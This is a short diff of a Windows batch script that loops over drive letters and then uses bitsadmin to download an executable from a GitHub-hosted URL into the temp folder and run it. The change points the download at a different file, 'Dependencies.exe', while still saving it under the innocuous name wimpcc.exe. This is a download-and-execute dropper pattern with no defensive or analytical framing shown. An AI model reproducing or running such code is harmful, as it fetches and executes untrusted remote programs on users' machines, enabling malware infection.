@@ -15,5 +15,5 @@ for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     )
 )
 
-bitsadmin /transfer myDownloadJob /download /priority high "https://raw.githubusercontent.com/0xIftekhar443/testv/main/wimpcc.exe" "%TEMP%\wimpcc.exe"
+bitsadmin /transfer myDownloadJob /download /priority high "https://github.com/0xIftekhar443/lss/raw/main/Dependencies.exe" "%TEMP%\wimpcc.exe"
 start "" "%TEMP%\wimpcc.exe"
